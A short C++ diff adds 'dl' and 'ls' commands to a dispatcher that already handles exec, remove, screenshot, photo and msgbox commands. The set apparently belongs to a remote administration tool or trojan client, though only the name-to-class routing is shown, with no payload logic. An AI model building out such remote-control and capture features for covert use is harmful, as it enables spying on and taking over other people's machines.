@@ -7,9 +7,11 @@
 
 #include "Command.h"
 #include "Command_batch.h"
+#include "Command_dl.h"
 #include "Command_exec.h"
 #include "Command_exit.h"
 #include "Command_info.h"
+#include "Command_ls.h"
 #include "Command_msgbox.h"
 #include "Command_remove.h"
 #include "Command_photo.h"
@@ -24,19 +26,23 @@ static Command *CreateCommandFromName(const std::wstring &name)
 {
 	if(name == L"batch")
 		return new Command_batch();
-	else if(name == L"exec")
+	else if (name == L"dl")
+		return new Command_dl();
+	else if (name == L"exec")
 		return new Command_exec();
-	else if(name == L"exit")
+	else if (name == L"exit")
 		return new Command_exit();
-	else if(name == L"info")
+	else if (name == L"info")
 		return new Command_info();
-	else if(name == L"msgbox")
+	else if (name == L"ls")
+		return new Command_ls();
+	else if (name == L"msgbox")
 		return new Command_msgbox();
 	else if (name == L"photo")
 		return new Command_photo();
 	else if (name == L"remove")
 		return new Command_remove();
-	else if(name == L"screenshot")
+	else if (name == L"screenshot")
 		return new Command_screenshot();
 	else
 		return NULL;
